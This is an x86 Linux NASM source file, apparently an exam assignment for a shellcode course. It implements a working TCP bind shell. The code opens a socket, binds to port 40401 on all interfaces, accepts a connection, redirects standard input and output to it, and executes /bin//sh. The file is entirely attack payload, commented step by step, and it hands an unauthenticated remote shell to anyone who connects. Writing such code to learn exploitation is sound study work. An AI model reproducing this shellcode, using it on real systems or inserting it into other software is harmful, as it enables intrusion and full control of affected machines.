; Filename: shellBind.nasm
; Author:   Muhereza Herbert
; Website:  http://kilobytesecurity.com
;
; Purpose: SLAE Exam requirement Assignment One

global _start			

section .text
_start:

	;socketcall(socket[1], unsigned long *args{ PF_INET[2], SOCK_STREAM[1], 0 })
	xor eax, eax
	xor ebx, ebx
	inc ebx ; ebx = 1(socket)
	push eax ; args pushed to stack in reverse: { protocol = 0, SOCK_STREAM = 1, AF_INET = 2 }
	push BYTE 0x1
	push BYTE 0x2
	mov ecx, esp ; ecx = ptr to args
	mov al, 102 ; socketcall syscall #0x66 || 102
	int 0x80 ; syscall returns to eax with socket fd.

	mov esi, eax ; save in esi for later

	; bind(int sockfd(), const struct sockaddr *addr[2, 40401, 0], socklen_t addrlen(16))
	inc ebx ; ebx = 2(bind)
	xor eax, eax
		;Build sockaddr struct in reverse: INADDR_ANY = 0, PORT = 40401 || 0x9dd1, AF_INET = 2
		push eax   
		push WORD 0xd19d ;reversed 
		push WORD bx 
		mov ecx, esp ;ecx = server struct pointer
			;Push bind()args to stack in reverse: sizeof(server struct)==16, *args of sockaddr==ecx, socket fd==esi
			push BYTE 16
			push ecx 
			push esi
	;Make Syscall #102
	mov ecx, esp ;ecx = bind() args array
	mov al, 102
	int 0x80 ; eax = 0 on success
	
	;listen(int sockfd(), int backlog(0))
	inc ebx
	inc ebx ; ebx = 4(listen)
		;Push listen() args onto stack in reverse: backlog=dummy=4=ebx,  socket fd==esi
		push ebx
		push esi
	;Make Syscall #102
	mov ecx, esp ;ecx = listen() args array
	mov BYTE al, 102
	int 0x80
	
	;accept(int sockfd, struct sockaddr *addr(NULL), socklen_t *addrlen(0))
	xor eax, eax
	inc ebx ; ebx = 5(accept)
		;Push accept() args onto stack in reverse: socklen==0,  *sockaddr==NULL==0
		push eax
		push eax
		push esi
	;Make Syscall #102
	mov ecx, esp ;ecx = accept() args array
	mov BYTE al, 102
	int 0x80

	; dup2(connected sock(ebx), all STD-I/O/E FDs(ecx))
	mov ebx, eax 		; Put socket FD into ebx(becomes old fd)
	xor ecx, ecx 		
	mov cl, 2		; ecx starts at 2.
	xor eax, eax
	sys_loop:
		mov al, 63
		int 0x80	
		dec cl	
	jns sys_loop 		; If the sign flag is not set, ecx is not negative.


	; execve(const char *filename, char *const argv [], char *const envp[]) 
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80

